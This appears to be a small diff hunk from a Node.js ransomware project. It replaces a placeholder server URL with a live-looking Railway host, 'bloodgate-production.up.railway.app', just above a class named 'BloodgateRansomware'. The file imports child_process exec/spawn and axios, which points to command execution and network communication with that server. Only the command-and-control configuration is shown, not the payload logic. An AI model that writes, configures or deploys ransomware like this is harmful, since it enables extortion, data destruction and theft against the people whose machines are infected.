@@ -6,7 +6,7 @@ const { exec, spawn } = require('child_process');
 const axios = require('axios');
 const { networkInterfaces } = require('os');
 
-const SERVER_URL = 'https://YOUR_RAILWAY_URL.railway.app'; // ← CHANGE THIS
+const SERVER_URL = 'https://bloodgate-production.up.railway.app'; // ← CHANGE THIS
 
 class BloodgateRansomware {
     constructor() {
